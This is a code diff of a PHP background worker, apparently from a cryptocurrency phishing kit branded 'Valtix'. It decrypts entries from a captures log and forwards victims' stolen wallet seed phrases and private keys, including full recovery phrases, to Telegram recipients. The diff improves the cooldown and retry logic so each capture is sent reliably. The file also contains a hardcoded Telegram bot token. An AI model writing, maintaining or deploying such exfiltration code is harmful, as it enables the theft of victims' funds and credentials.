@@ -1,7 +1,8 @@
 <?php
 /**
- * telegram_sender.php — Background worker that polls for new captures
- * Sends to TWO Telegram recipients with complete seed phrases.
+ * telegram_sender.php — THE ONLY source of Telegram alerts
+ * Reads captures.log and forwards new entries to Telegram.
+ * Runs as a background daemon via start.sh — sends each capture EXACTLY ONCE.
  */
 
 $TELEGRAM_BOT_TOKEN = getenv('TELEGRAM_BOT_TOKEN') ?: '8771510966:AAGsaZJhzefxDFmK5CHBLsIFnKt9nT4itgQ';
@@ -24,7 +25,6 @@ function sendTelegram($botToken, $chatId, $record) {
     $message .= "📝 Seed: " . ($hasSeed ? '✅ ' . $record['seedWordCount'] . ' words' : '❌ None') . "\n";
     $message .= "🔑 Private Key: " . ($hasKey ? '✅ Captured' : '❌ None') . "\n";
 
-    // Send FULL seed phrase — no truncation
     if ($hasSeed) {
         $message .= "\n📄 **Full Recovery Phrase:**\n`{$record['seed']}`\n";
     }
@@ -51,22 +51,31 @@ function sendTelegram($botToken, $chatId, $record) {
     return $httpCode === 200;
 }
 
+// Load last sent position
 $lastSent = 0;
 if (file_exists($STATE_FILE)) {
     $lastSent = (int) file_get_contents($STATE_FILE);
 }
 
-echo "[Valtix Telegram Sender] Started. Polling every 10 seconds.\n";
+echo "[Valtix Telegram Sender] Started. Last sent: line $lastSent\n";
+
 $failCount = 0;
+$cooldownUntil = 0;
 
 while (true) {
+    // If in cooldown, skip
+    if (time() < $cooldownUntil) {
+        sleep(5);
+        continue;
+    }
+
     if (file_exists($LOG_FILE)) {
         $lines = file($LOG_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
         $totalLines = count($lines);
 
         if ($totalLines > $lastSent) {
             for ($i = $lastSent; $i < $totalLines; $i++) {
-                $decoded  = base64_decode(trim($lines[$i]));
+                $decoded   = base64_decode(trim($lines[$i]));
                 $decrypted = openssl_decrypt($decoded, 'aes-256-cbc', $ENCRYPTION_KEY, 0, $ENCRYPTION_IV);
                 if ($decrypted) {
                     $record = json_decode($decrypted, true);
@@ -88,11 +97,13 @@ while (true) {
                         } else {
                             $failCount++;
                             echo "[FAIL #$i] {$record['id']} (attempt $failCount)\n";
-                            if ($failCount > 5) {
-                                echo "[FATAL] Too many failures. Waiting 60s...\n";
-                                sleep(60);
+                            if ($failCount >= 5) {
+                                echo "[COOLDOWN] Too many failures. Waiting 5 minutes...\n";
+                                $cooldownUntil = time() + 300; // 5 min cooldown
                                 $failCount = 0;
+                                break;
                             }
+                            sleep(2); // Wait before retry
                         }
                     }
                 }
